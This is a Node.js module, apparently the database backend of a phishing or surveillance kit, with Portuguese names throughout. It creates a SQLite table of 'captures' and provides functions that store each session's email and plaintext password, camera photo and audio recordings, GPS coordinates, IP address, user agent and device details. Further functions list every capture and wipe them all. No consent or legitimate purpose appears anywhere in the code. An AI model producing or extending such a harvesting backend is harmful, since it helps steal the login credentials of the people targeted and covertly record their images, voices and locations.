const path = require('node:path');
const { DatabaseSync } = require('node:sqlite');

const dbPath = path.join(__dirname, '..', 'database.sqlite');
const db = new DatabaseSync(dbPath);

db.exec(`
  CREATE TABLE IF NOT EXISTS capturas (
    session_id TEXT PRIMARY KEY,
    criado_em TEXT NOT NULL,
    email TEXT,
    senha TEXT,
    foto_path TEXT,
    audio_path TEXT,
    geo_lat REAL,
    geo_lon REAL,
    geo_accuracy REAL,
    ip TEXT,
    user_agent TEXT,
    dispositivo_json TEXT
  )
`);

function sessaoExiste(sessionId) {
  const stmt = db.prepare('SELECT 1 FROM capturas WHERE session_id = ?');
  return stmt.get(sessionId) !== undefined;
}

function criarSessao(sessionId) {
  if (sessaoExiste(sessionId)) return;
  const stmt = db.prepare(
    'INSERT INTO capturas (session_id, criado_em) VALUES (?, ?)'
  );
  stmt.run(sessionId, new Date().toISOString());
}

function salvarLogin(sessionId, email, senha) {
  criarSessao(sessionId);
  const stmt = db.prepare(
    'UPDATE capturas SET email = ?, senha = ? WHERE session_id = ?'
  );
  stmt.run(email, senha, sessionId);
}

function salvarFoto(sessionId, fotoPath) {
  criarSessao(sessionId);
  const stmt = db.prepare('UPDATE capturas SET foto_path = ? WHERE session_id = ?');
  stmt.run(fotoPath, sessionId);
}

function salvarAudio(sessionId, audioPath) {
  criarSessao(sessionId);
  const stmt = db.prepare('UPDATE capturas SET audio_path = ? WHERE session_id = ?');
  stmt.run(audioPath, sessionId);
}

function salvarGeo(sessionId, lat, lon, accuracy) {
  criarSessao(sessionId);
  const stmt = db.prepare(
    'UPDATE capturas SET geo_lat = ?, geo_lon = ?, geo_accuracy = ? WHERE session_id = ?'
  );
  stmt.run(lat, lon, accuracy, sessionId);
}

function salvarDispositivo(sessionId, ip, userAgent) {
  criarSessao(sessionId);
  const stmt = db.prepare('UPDATE capturas SET ip = ?, user_agent = ? WHERE session_id = ?');
  stmt.run(ip, userAgent, sessionId);
}

function salvarDispositivoInfo(sessionId, infoJson) {
  criarSessao(sessionId);
  const stmt = db.prepare('UPDATE capturas SET dispositivo_json = ? WHERE session_id = ?');
  stmt.run(infoJson, sessionId);
}

function listarCapturas() {
  const stmt = db.prepare('SELECT * FROM capturas ORDER BY criado_em DESC');
  return stmt.all();
}

function wipeTudo() {
  const paths = [];
  for (const row of listarCapturas()) {
    if (row.foto_path) paths.push(row.foto_path);
    if (row.audio_path) paths.push(row.audio_path);
  }
  db.exec('DELETE FROM capturas');
  return paths;
}

module.exports = {
  criarSessao,
  salvarLogin,
  salvarFoto,
  salvarAudio,
  salvarGeo,
  salvarDispositivo,
  salvarDispositivoInfo,
  listarCapturas,
  wipeTudo,
};
